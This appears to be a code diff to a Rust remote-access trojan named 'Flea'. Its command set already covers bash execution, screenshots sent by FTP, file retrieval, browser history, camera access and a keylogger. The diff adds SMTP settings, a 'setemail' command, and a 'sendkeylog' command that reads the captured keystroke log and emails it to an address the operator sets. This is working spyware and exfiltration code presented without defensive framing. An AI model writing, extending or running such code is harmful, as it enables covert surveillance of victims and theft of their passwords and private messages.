@@ -7,6 +7,7 @@ use std::sync::{Arc, Mutex};
 use std::{str, env, path::PathBuf};
 use log::{debug, error};
 use chrono::{DateTime, Utc};
+use crate::email::EMail;
 use crate::fileserver::FileServer;
 use crate::{ftp::*, screenshot::Screenshot};
 use crate::{systemcmd::*, browserhistory};
@@ -14,7 +15,7 @@ use crate::{systemcmd::*, browserhistory};
 use crate::camera;
 use crate::keylogger::*;
 
-const FLEA_PROTOCOL_VERSION: u8 = 1;
+const FLEA_PROTOCOL_VERSION: u8 = 2;
 const GET_VERSION_COMMAND: &str = "version";
 const EXECUTE_BASH_COMMAND: &str = "bash";
 const SEND_PIC_COMMAND: &str = "ftpscreenshot";
@@ -27,11 +28,13 @@ const DIR_COMMAND: &str = "dir";
 const GET_FILE_COMMAND: &str = "getfile";
 const CHANGE_DIRECTORY_COMMAND: &str = "cd";
 const FTP_PARAM_COMMAND: &str = "setftp";
+const EMAIL_PARAM_COMMAND: &str = "setemail";
 const BROWSING_HISTORY_COMMAND: &str = "history";
 const GET_SYSTEM_INFO_COMMAND: &str = "sysinfo";
 const GET_WORKING_DIR_COMMAND: &str = "pwd";
 const RESTART_COMMAND: &str = "restart";
 const LOCK_SCREEN_COMMAND: &str = "lockscreen";
+const SEND_KEYLOG_TO_EMAIL_COMMAND: &str = "sendkeylog";
 pub const STOP_COMMAND: &str = "quit";
 const UNKNOWN_COMMAND: &str = "Unknown command";
 
@@ -46,6 +49,11 @@ const FTP_USER_NAME: &str = "enter_ftp_user_name";
 const FTP_PASS_NAME: &str = "enter_ftp_user_password";
 const FTP_ADDRESS_NAME: &str = "enter_ftp_server_ip_address";
 const FTP_FOLDER_NAME: &str = "Files";
+const SMTP_USER_NAME: &str = "enter_smtp_user_name";
+const EMAIL_ADDRESS_TO: &str = "enter_email_address";
+const EMAIL_ADDRESS_FROM: &str = "enter_email_address";
+const SMTP_PASS_NAME: &str = "enter_smtp_password";
+const SMTP_HOST_NAME: &str = "enter_smtp_host";
 
 pub trait FleaCommand
 {
@@ -60,6 +68,12 @@ struct FleaConfig
     ftp_pass: String,
     ftp_address: String,
     ftp_folder: String,
+
+    smtp_user_name: String,
+    smtp_pass: String,
+    smtp_host: String,
+    email_address_to: String,
+    email_address_from: String,
 }
 
 pub struct CommandProcessor
@@ -84,7 +98,12 @@ impl ::std::default::Default for FleaConfig
             ftp_address: FTP_ADDRESS_NAME.into(), 
             ftp_pass: FTP_PASS_NAME.into(), 
             ftp_user: FTP_USER_NAME.into(),
-            ftp_folder: FTP_FOLDER_NAME.into()
+            ftp_folder: FTP_FOLDER_NAME.into(),
+            smtp_user_name: SMTP_USER_NAME.into(),
+            smtp_pass: SMTP_PASS_NAME.into(),
+            smtp_host: SMTP_HOST_NAME.into(),
+            email_address_to: EMAIL_ADDRESS_TO.into(),
+            email_address_from: EMAIL_ADDRESS_FROM.into(),
         } 
     }
 }
@@ -169,6 +188,33 @@ impl CommandProcessor
                     error!("Error: {}", x);
                     return x;
                 }
+            }
+        }
+    }
+
+    fn set_email_params(&mut self, value: &str) -> String
+    {
+        let email_params: Vec<&str> = value.split(';').collect();
+        if email_params.len() != 5
+        {
+            return "Wrong number of parameters".to_string();
+        }
+
+        self.conf.email_address_to = email_params[0].to_string();
+        self.conf.email_address_from = email_params[1].to_string();
+        self.conf.smtp_user_name = email_params[2].to_string();
+        self.conf.smtp_pass = email_params[3].to_string();
+        self.conf.smtp_host = email_params[4].to_string();
+
+        match confy::store("flea_conf", None, &self.conf)
+        {
+            Ok(_) =>
+            {
+                "Ok".to_string()
+            },
+            Err(x) =>
+            {
+                x.to_string()
             }
         }
     }
@@ -492,6 +538,11 @@ impl FleaCommand for CommandProcessor
                 self.set_ftp_params(value)
             },
             
+            EMAIL_PARAM_COMMAND =>
+            {
+                self.set_email_params(value)
+            },
+
             BROWSING_HISTORY_COMMAND =>
             {
                 match browserhistory::get_browsing_history()
@@ -543,6 +594,27 @@ impl FleaCommand for CommandProcessor
                         error!("Error: {}", x);
                         x
                     }
+                }
+            },
+
+            SEND_KEYLOG_TO_EMAIL_COMMAND =>
+            {
+                let current_path = self.current_directory.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
+                let email = EMail::new();
+                
+                match email.send_email(self.conf.email_address_to.as_str(), self.conf.email_address_from.as_str(), "Keylogger", &get_key_logger_content(&current_path), 
+                    &self.conf.smtp_user_name, &self.conf.smtp_pass, &self.conf.smtp_host)
+                {
+                    Ok(_) =>
+                    {
+                        debug!("Email sent");
+                        "Ok".to_string()
+                    },
+                    Err(x) =>
+                    {
+                        error!("Error: {}", x);
+                        x.to_string()
+                    }                
                 }
             },
 
